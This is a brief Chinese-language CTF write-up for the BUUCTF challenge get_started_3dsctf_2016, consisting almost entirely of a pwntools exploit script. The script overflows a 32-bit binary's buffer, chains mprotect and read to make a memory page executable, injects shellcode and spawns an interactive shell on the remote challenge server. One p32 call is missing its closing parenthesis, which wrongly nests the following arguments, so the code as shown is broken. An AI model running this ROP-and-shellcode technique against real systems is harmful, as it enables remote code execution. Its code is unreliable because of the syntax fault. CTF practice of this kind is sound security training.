# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#get_started_3dsctf_2016)

第二种解题思路，通过mprotect函数修改内存权限

# exp

```python
from pwn import *
context(os='linux',arch='i386',log_level='debug')
elf = ELF('./get_started_3dsctf_2016')
r=remote('node5.buuoj.cn',28232)
pop3_ret = 0x0806fc08	#pop三个寄存器
mem_addr = 0x80EB000	#要修改的地址
mem_size = 0x1000	#修改长度
mem_proc = 0x7	#权限rwx
mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']
payload1 = flat(b'A'*0x38 , p32(mprotect_addr) , p32(pop3_ret , p32(mem_addr) , p32(mem_size) , p32(mem_proc) , p32(read_addr) , p32(pop3_ret) , p32(0) , p32(mem_addr) , p32(0x100) , p32(mem_addr))
r.sendline(payload1)
payload2 = asm(shellcraft.sh()) 
r.sendline(payload2)
r.interactive()
```

